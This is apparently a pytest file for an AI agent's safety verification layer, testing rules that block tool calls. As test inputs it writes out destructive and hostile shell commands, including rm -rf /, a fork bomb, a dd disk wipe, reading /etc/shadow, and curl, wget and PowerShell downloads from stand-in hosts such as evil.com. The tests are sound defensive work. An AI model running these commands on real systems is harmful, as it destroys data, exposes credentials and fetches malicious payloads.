"""Tests for Phase 31→32: Verification Layer (L0, L1, L3).

Covers:
- L0: Pre-cognitive context enrichment
- L1: Rigid rule interception (R01–R04 + R05/R07/R08/R09)
- L3: Post-reflection & knowledge extraction + anti-pattern auditing
- Config: VerificationConfig defaults and parsing
"""

import asyncio
import json
import pytest
from dataclasses import dataclass
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

from nanobot.config.schema import Config, VerificationConfig
from nanobot.agent.verification import (
    VerificationLayer,
    RuleResult,
    _check_rule_message_content,
    _check_rule_destructive_exec,
    _check_rule_duplicate_calls,
    _check_rule_outlook_recipient,
    _check_rule_exec_length,
    _check_rule_sensitive_path,
    _check_rule_tool_call_count,
    _check_rule_network_exfiltration,
)


# ── Helpers ────────────────────────────────────────────────────────────

@dataclass
class FakeToolCall:
    """Minimal tool call mimic for rule tests."""
    id: str = "tc_001"
    name: str = "test_tool"
    arguments: dict = None

    def __post_init__(self):
        if self.arguments is None:
            self.arguments = {}


def _make_verification(
    l0_enabled=True, l1_enabled=True, l3_enabled=True,
    l3_min_tools=3,
    knowledge_workflow=None, reflection_store=None, provider=None, model=None,
) -> VerificationLayer:
    """Create a VerificationLayer with specified config overrides."""
    cfg = VerificationConfig(
        l0_enabled=l0_enabled,
        l1_enabled=l1_enabled,
        l3_enabled=l3_enabled,
        l3_success_pattern_min_tools=l3_min_tools,
    )
    return VerificationLayer(
        config=cfg,
        provider=provider,
        model=model,
        knowledge_workflow=knowledge_workflow,
        reflection_store=reflection_store,
    )


# ═══════════════════════════════════════════════════════════════════════
# Config Tests
# ═══════════════════════════════════════════════════════════════════════

def test_verification_config_defaults():
    """Default values: L0/L1/L3 on."""
    cfg = VerificationConfig()
    assert cfg.l0_enabled is True
    assert cfg.l1_enabled is True
    assert cfg.l3_enabled is True
    assert cfg.l3_success_pattern_min_tools == 3


def test_verification_config_from_json():
    """JSON config values should be correctly parsed (L2 fields ignored gracefully)."""
    data = {
        "l0Enabled": True,
        "l1Enabled": False,
        "l2Enabled": True,      # old field — should be silently ignored
        "l2Model": "gpt-4o-mini",  # old field — should be silently ignored
        "l3Enabled": False,
        "l3SuccessPatternMinTools": 5,
    }
    cfg = VerificationConfig(**data)
    assert cfg.l0_enabled is True
    assert cfg.l1_enabled is False
    assert cfg.l3_enabled is False
    assert cfg.l3_success_pattern_min_tools == 5
    # l2 fields should NOT exist on the config object
    assert not hasattr(cfg, 'l2_enabled')


def test_verification_config_in_agents_config():
    """VerificationConfig should exist in the full Config hierarchy."""
    cfg = Config()
    assert hasattr(cfg.agents, "verification")
    assert isinstance(cfg.agents.verification, VerificationConfig)
    assert cfg.agents.verification.l0_enabled is True


# ═══════════════════════════════════════════════════════════════════════
# L0: Pre-cognitive Context Enrichment
# ═══════════════════════════════════════════════════════════════════════

def test_l0_enrich_context_injects_experience():
    """Experience hints should be injected into system prompt."""
    mock_kw = MagicMock()
    mock_kw.match_experience.return_value = "Use outlook tool for email tasks."

    mock_mem = MagicMock()
    mock_mem.experience_enabled = True
    mock_mem.reflection_enabled = False

    v = _make_verification(knowledge_workflow=mock_kw)
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "send email", 0, memory_features=mock_mem)

    assert injected > 0
    assert "Helpful Experience" in msgs[0]["content"]
    assert "outlook" in msgs[0]["content"]


def test_l0_enrich_context_respects_budget():
    """Injection should not exceed _INJECTION_BUDGET."""
    mock_kw = MagicMock()
    # Return a huge experience that would bust the budget
    mock_kw.match_experience.return_value = "x" * 10000

    mock_mem = MagicMock()
    mock_mem.experience_enabled = True
    mock_mem.reflection_enabled = False

    v = _make_verification(knowledge_workflow=mock_kw)
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "test", 0, memory_features=mock_mem)

    # Should not inject since the hint exceeds budget
    assert injected == 0
    assert "Helpful Experience" not in msgs[0]["content"]


def test_l0_enrich_context_disabled():
    """When l0_enabled=False, no injection should occur."""
    mock_kw = MagicMock()
    mock_kw.match_experience.return_value = "hint"
    v = _make_verification(l0_enabled=False, knowledge_workflow=mock_kw)
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "test", 0)

    assert injected == 0
    assert msgs[0]["content"] == "Base prompt"


def test_l0_enrich_context_injects_reflections():
    """Reflection memories should be injected into system prompt."""
    mock_ref = MagicMock()
    mock_ref.search_reflections.return_value = [
        {"trigger": "email task", "failure_reason": "wrong tool", "corrective_action": "use outlook"}
    ]

    mock_mem = MagicMock()
    mock_mem.experience_enabled = False
    mock_mem.reflection_enabled = True

    v = _make_verification(reflection_store=mock_ref)
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "send email", 0, memory_features=mock_mem)

    assert injected > 0
    assert "Avoid Past Mistakes" in msgs[0]["content"]
    assert "wrong tool" in msgs[0]["content"]


def test_l0_system_reminder_injected_on_long_session():
    """System reminder should be injected when session message count >= 15."""
    mock_mem = MagicMock()
    mock_mem.experience_enabled = False
    mock_mem.reflection_enabled = False

    v = _make_verification()
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "test", 20, memory_features=mock_mem)

    assert injected > 0
    assert "System Reminder" in msgs[0]["content"]


def test_l0_no_system_reminder_for_short_session():
    """No system reminder for sessions with < 15 messages."""
    mock_mem = MagicMock()
    mock_mem.experience_enabled = False
    mock_mem.reflection_enabled = False

    v = _make_verification()
    msgs = [{"role": "system", "content": "Base prompt"}]

    injected = v.enrich_context(msgs, "test", 5, memory_features=mock_mem)

    assert injected == 0


# ═══════════════════════════════════════════════════════════════════════
# L1: Rigid Rule Interception
# ═══════════════════════════════════════════════════════════════════════

def test_l1_check_rules_passes_valid_call():
    """Valid tool calls should pass all rules."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo hello"})
    result = v.check_rules([tc])
    assert result.passed is True
    assert len(result.violations) == 0


def test_l1_check_rules_blocks_empty_message_content():
    """R01: message tool with empty content should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="message", arguments={"content": "", "chat_id": "123"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R01" in v for v in result.violations)


def test_l1_check_rules_blocks_destructive_exec():
    """R02: Destructive shell commands should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "rm -rf / --no-preserve-root"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R02" in v for v in result.violations)


def test_l1_check_rules_allows_safe_rm():
    """R02: Safe rm commands should NOT be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "rm -rf /tmp/test_dir"})
    result = v.check_rules([tc])
    # Should pass — /tmp/test_dir is not root
    assert result.passed is True


def test_l1_check_rules_blocks_fork_bomb():
    """R02: Fork bomb should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": ":(){ :|:& }"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R02" in v for v in result.violations)


def test_l1_check_rules_detects_duplicate_calls():
    """R03: 3+ identical tool calls in same turn should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo x"})
    result = v.check_rules([tc, tc, tc])
    assert result.passed is False
    assert any("R03" in v for v in result.violations)


def test_l1_check_rules_allows_two_identical_calls():
    """R03: 2 identical calls should NOT trigger the rule (threshold is 3)."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo x"})
    result = v.check_rules([tc, tc])
    assert result.passed is True


def test_l1_check_rules_blocks_empty_outlook_recipient():
    """R04: outlook send_email without recipient should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="outlook", arguments={
        "action": "send_email", "to": "", "subject": "Test", "body": "Hi"
    })
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R04" in v for v in result.violations)


def test_l1_check_rules_disabled():
    """When l1_enabled=False, all calls should pass."""
    v = _make_verification(l1_enabled=False)
    tc = FakeToolCall(name="message", arguments={"content": ""})
    result = v.check_rules([tc])
    assert result.passed is True


def test_l1_rewrite_hint_present_on_violation():
    """Violation result should include a rewrite hint."""
    v = _make_verification()
    tc = FakeToolCall(name="message", arguments={"content": ""})
    result = v.check_rules([tc])
    assert result.rewrite_hint is not None
    assert "correct your approach" in result.rewrite_hint


# ═══════════════════════════════════════════════════════════════════════
# L1: New Rules R05/R07/R08/R09 (Phase 32)
# ═══════════════════════════════════════════════════════════════════════

def test_l1_r05_blocks_long_exec_command():
    """R05: exec commands exceeding 2000 chars should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo " + "x" * 2100})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R05" in v for v in result.violations)


def test_l1_r05_allows_normal_exec_command():
    """R05: exec commands under 2000 chars should pass."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "echo hello world"})
    result = v.check_rules([tc])
    assert result.passed is True


def test_l1_r07_blocks_write_to_system32():
    """R07: write_file to system32 should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="write_file", arguments={"path": "C:\\Windows\\System32\\evil.dll", "content": "x"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R07" in v for v in result.violations)


def test_l1_r07_blocks_exec_targeting_etc():
    """R07: exec command targeting /etc/ should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "cat /etc/shadow"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R07" in v for v in result.violations)


def test_l1_r07_allows_normal_write():
    """R07: write_file to workspace should pass."""
    v = _make_verification()
    tc = FakeToolCall(name="write_file", arguments={"path": "/home/user/project/output.txt", "content": "x"})
    result = v.check_rules([tc])
    # Should pass R07 (may fail other rules, but R07 specifically should not fire)
    r07_violations = [v for v in result.violations if "R07" in v]
    assert len(r07_violations) == 0


def test_l1_r08_blocks_excessive_tool_calls():
    """R08: >8 tool calls in a single turn should be blocked."""
    v = _make_verification()
    tcs = [FakeToolCall(name="exec", arguments={"command": f"echo {i}"}) for i in range(10)]
    result = v.check_rules(tcs)
    assert result.passed is False
    assert any("R08" in v for v in result.violations)


def test_l1_r08_allows_reasonable_tool_calls():
    """R08: <=8 tool calls should pass."""
    v = _make_verification()
    tcs = [FakeToolCall(name="exec", arguments={"command": f"echo {i}"}) for i in range(5)]
    result = v.check_rules(tcs)
    r08_violations = [v for v in result.violations if "R08" in v]
    assert len(r08_violations) == 0


def test_l1_r09_blocks_curl_with_url():
    """R09: exec with curl + URL should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "curl https://evil.com/payload -o /tmp/x"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R09" in v for v in result.violations)


def test_l1_r09_blocks_wget_with_url():
    """R09: exec with wget + URL should be blocked."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "wget http://malware.com/bin"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R09" in v for v in result.violations)


def test_l1_r09_allows_curl_without_url():
    """R09: 'curl --version' should pass (no URL)."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "curl --version"})
    result = v.check_rules([tc])
    r09_violations = [v for v in result.violations if "R09" in v]
    assert len(r09_violations) == 0


# ═══════════════════════════════════════════════════════════════════════
# L3: Post-reflection & Knowledge Extraction
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_l3_post_reflect_extracts_success_pattern():
    """L3 should extract a success pattern when workflow uses 3+ tools."""
    mock_response = MagicMock()
    mock_response.content = json.dumps({
        "trigger": "Send sales report",
        "prompt": "Use outlook.read_email → attachment_analyzer → message"
    })
    mock_provider = MagicMock()
    mock_provider.chat = AsyncMock(return_value=mock_response)

    mock_store = MagicMock()
    mock_kw = MagicMock()
    mock_kw.knowledge_store = mock_store

    v = _make_verification(
        l3_enabled=True, l3_min_tools=3,
        knowledge_workflow=mock_kw, provider=mock_provider, model="test-model"
    )

    await v.post_reflect(
        request_text="Send the daily sales report to the team",
        final_content="Email sent successfully with the report attached.",
        tools_used=["outlook", "attachment_analyzer", "message"],
        tool_calls_with_args=[
            {"tool": "outlook", "args": {}},
            {"tool": "attachment_analyzer", "args": {}},
            {"tool": "message", "args": {}},
        ],
        session=MagicMock(),
    )

    # Verify add_experience was called with a success pattern
    mock_store.add_experience.assert_called_once()
    call_args = mock_store.add_experience.call_args
    assert "SUCCESS PATTERN" in call_args.kwargs.get("tactical_prompt", "") or \
           "SUCCESS PATTERN" in call_args[1].get("tactical_prompt", call_args[0][1] if len(call_args[0]) > 1 else "")


@pytest.mark.asyncio
async def test_l3_post_reflect_skips_short_workflows():
    """L3 should skip extraction when fewer than min_tools used."""
    mock_provider = MagicMock()
    mock_kw = MagicMock()
    mock_kw.knowledge_store = MagicMock()

    v = _make_verification(
        l3_enabled=True, l3_min_tools=3,
        knowledge_workflow=mock_kw, provider=mock_provider, model="test-model"
    )

    await v.post_reflect(
        request_text="hello",
        final_content="Hi there!",
        tools_used=["message"],
        tool_calls_with_args=[{"tool": "message", "args": {}}],
        session=MagicMock(),
    )

    # Should NOT call LLM
    mock_provider.chat.assert_not_called()


@pytest.mark.asyncio
async def test_l3_post_reflect_disabled():
    """L3 should skip entirely when disabled."""
    mock_provider = MagicMock()
    v = _make_verification(l3_enabled=False, provider=mock_provider)

    await v.post_reflect(
        request_text="test",
        final_content="done",
        tools_used=["a", "b", "c"],
        tool_calls_with_args=[{"tool": "a", "args": {}}] * 3,
        session=MagicMock(),
    )

    mock_provider.chat.assert_not_called()


@pytest.mark.asyncio
async def test_l3_post_reflect_handles_error():
    """L3 should not crash when LLM call fails."""
    mock_provider = MagicMock()
    mock_provider.chat = AsyncMock(side_effect=RuntimeError("API error"))

    mock_kw = MagicMock()
    mock_kw.knowledge_store = MagicMock()

    v = _make_verification(
        l3_enabled=True, l3_min_tools=2,
        knowledge_workflow=mock_kw, provider=mock_provider, model="test-model"
    )

    # Should not raise
    await v.post_reflect(
        request_text="test task",
        final_content="completed successfully",
        tools_used=["a", "b", "c"],
        tool_calls_with_args=[{"tool": "a", "args": {}}] * 3,
        session=MagicMock(),
    )


@pytest.mark.asyncio
async def test_l3_skips_failed_workflows():
    """L3 should not extract success patterns from failed workflows."""
    mock_provider = MagicMock()
    mock_kw = MagicMock()
    mock_kw.knowledge_store = MagicMock()

    v = _make_verification(
        l3_enabled=True, l3_min_tools=2,
        knowledge_workflow=mock_kw, provider=mock_provider, model="test-model"
    )

    # final_content contains a fail indicator
    await v.post_reflect(
        request_text="send email",
        final_content="很抱歉，无法完成此任务",
        tools_used=["outlook", "message", "exec"],
        tool_calls_with_args=[{"tool": "outlook", "args": {}}] * 3,
        session=MagicMock(),
    )

    # Should NOT call LLM since workflow failed
    mock_provider.chat.assert_not_called()


# ═══════════════════════════════════════════════════════════════════════
# Individual Rule Function Tests (unit-level)
# ═══════════════════════════════════════════════════════════════════════

def test_rule_message_content_valid():
    """R01: message with content should pass."""
    tc = FakeToolCall(name="message", arguments={"content": "Hello!"})
    assert _check_rule_message_content([tc]) == []


def test_rule_message_content_empty():
    """R01: message with empty content should fail."""
    tc = FakeToolCall(name="message", arguments={"content": "  "})
    violations = _check_rule_message_content([tc])
    assert len(violations) == 1
    assert "R01" in violations[0]


def test_rule_destructive_exec_safe():
    """R02: Safe exec should pass."""
    tc = FakeToolCall(name="exec", arguments={"command": "ls -la"})
    assert _check_rule_destructive_exec([tc]) == []


def test_rule_destructive_exec_rm_rf():
    """R02: rm -rf / should fail."""
    tc = FakeToolCall(name="exec", arguments={"command": "rm -rf /"})
    violations = _check_rule_destructive_exec([tc])
    assert len(violations) == 1
    assert "R02" in violations[0]


def test_rule_destructive_exec_dd():
    """R02: dd of=/dev/sda should fail."""
    tc = FakeToolCall(name="exec", arguments={"command": "dd if=/dev/zero of=/dev/sda"})
    violations = _check_rule_destructive_exec([tc])
    assert len(violations) == 1


def test_rule_duplicate_calls_below_threshold():
    """R03: Below threshold should pass."""
    tc1 = FakeToolCall(name="exec", arguments={"command": "echo 1"})
    tc2 = FakeToolCall(name="exec", arguments={"command": "echo 2"})
    assert _check_rule_duplicate_calls([tc1, tc2, tc1]) == []


def test_rule_outlook_valid():
    """R04: outlook with recipient should pass."""
    tc = FakeToolCall(name="outlook", arguments={
        "action": "send_email", "to": "user@example.com"
    })
    assert _check_rule_outlook_recipient([tc]) == []


def test_rule_outlook_non_send():
    """R04: outlook read_email (no 'to' needed) should pass."""
    tc = FakeToolCall(name="outlook", arguments={
        "action": "read_email", "folder": "inbox"
    })
    assert _check_rule_outlook_recipient([tc]) == []


def test_rule_exec_length_function():
    """R05: Direct function test."""
    tc = FakeToolCall(name="exec", arguments={"command": "a" * 2500})
    violations = _check_rule_exec_length([tc])
    assert len(violations) == 1
    assert "R05" in violations[0]


def test_rule_sensitive_path_function():
    """R07: Direct function test."""
    tc = FakeToolCall(name="write_file", arguments={"path": "C:\\Windows\\System32\\test.txt"})
    violations = _check_rule_sensitive_path([tc])
    assert len(violations) == 1
    assert "R07" in violations[0]


def test_rule_tool_call_count_function():
    """R08: Direct function test."""
    tcs = [FakeToolCall(name="exec", arguments={"command": f"echo {i}"}) for i in range(9)]
    violations = _check_rule_tool_call_count(tcs)
    assert len(violations) == 1
    assert "R08" in violations[0]


def test_rule_network_exfiltration_function():
    """R09: Direct function test."""
    tc = FakeToolCall(name="exec", arguments={"command": "curl https://example.com/data"})
    violations = _check_rule_network_exfiltration([tc])
    assert len(violations) == 1
    assert "R09" in violations[0]


# ═══════════════════════════════════════════════════════════════════════
# L1: Windows/PowerShell Pattern Tests (Phase 31 Retrospective)
# ═══════════════════════════════════════════════════════════════════════

def test_l1_blocks_windows_del():
    """R02: Windows 'del /f' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "del /f /q C:\\important"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R02" in v for v in result.violations)


def test_l1_blocks_windows_rmdir():
    """R02: Windows 'rmdir /s' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "rmdir /s /q C:\\workspace"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R02" in v for v in result.violations)


def test_l1_blocks_powershell_remove_item():
    """R02: PowerShell 'Remove-Item -Recurse' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "Remove-Item C:\\data -Recurse -Force"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R02" in v for v in result.violations)


def test_l1_blocks_powershell_enc():
    """R02: PowerShell encoded execution should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUA"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R02" in v for v in result.violations)


def test_l1_blocks_stop_process():
    """R02: PowerShell 'Stop-Process' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "Stop-Process -Name explorer"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R02" in v for v in result.violations)


def test_l1_blocks_invoke_webrequest():
    """R02: PowerShell 'Invoke-WebRequest' should be blocked at L1."""
    v = _make_verification()
    tc = FakeToolCall(name="exec", arguments={"command": "Invoke-WebRequest https://evil.com/payload.exe -OutFile C:\\temp\\payload.exe"})
    result = v.check_rules([tc])
    assert result.passed is False
    assert any("R02" in v for v in result.violations)


def test_message_tool_risk_tier_is_read_only():
    """MessageTool.get_risk_tier() should return READ_ONLY."""
    from nanobot.agent.tools.message import MessageTool
    from nanobot.agent.tools.base import RiskTier

    tool = MessageTool()
    assert tool.get_risk_tier({"content": "hello"}) == RiskTier.READ_ONLY


# ═══════════════════════════════════════════════════════════════════════
# ApprovalStore: Smart HITL Auto-Approve Rules
# ═══════════════════════════════════════════════════════════════════════

def test_approval_store_tool_level_matches_any_action(tmp_path):
    """Tool-level rule (action='') should match ANY action for that tool."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "")  # Tool-level wildcard

    assert store.is_approved("browser", {"action": "click", "selector": "text=\"Submit\""})
    assert store.is_approved("browser", {"action": "fill", "selector": "input#name", "value": "test"})
    assert store.is_approved("browser", {"action": "navigate", "url": "https://example.com"})
    assert store.is_approved("browser", {"action": "type", "selector": "textarea", "text": "hello"})


def test_approval_store_action_specific_only_matches_that_action(tmp_path):
    """Action-specific rule should NOT match other actions."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "click")

    assert store.is_approved("browser", {"action": "click", "selector": "text=\"OK\""})
    assert not store.is_approved("browser", {"action": "fill", "selector": "input", "value": "x"})


def test_approval_store_dedup_prevents_duplicates(tmp_path):
    """Adding the same rule twice should not create a duplicate."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "")
    store.add_approval("browser", "")  # Should be skipped
    store.add_approval("browser", "click")  # Should also be skipped (broader rule exists)

    assert len(store._rules) == 1


def test_approval_store_tool_level_subsumes_action_specific(tmp_path):
    """Adding a tool-level rule after action-specific ones: subsequent action calls should match."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "click")  # Action-specific first
    store.add_approval("browser", "")       # Then tool-level

    # Even "fill" should now match via the tool-level rule
    assert store.is_approved("browser", {"action": "fill", "selector": "input", "value": "x"})
    assert store.is_approved("browser", {"action": "click", "selector": "button"})


def test_approval_store_cross_tool_isolation(tmp_path):
    """Approving one tool should NOT approve a different tool."""
    from nanobot.agent.hitl_store import ApprovalStore
    store = ApprovalStore(tmp_path)
    store.add_approval("browser", "")

    assert store.is_approved("browser", {"action": "click"})
    assert not store.is_approved("exec", {"command": "rm -rf /"})
    assert not store.is_approved("outlook", {"action": "send_email"})

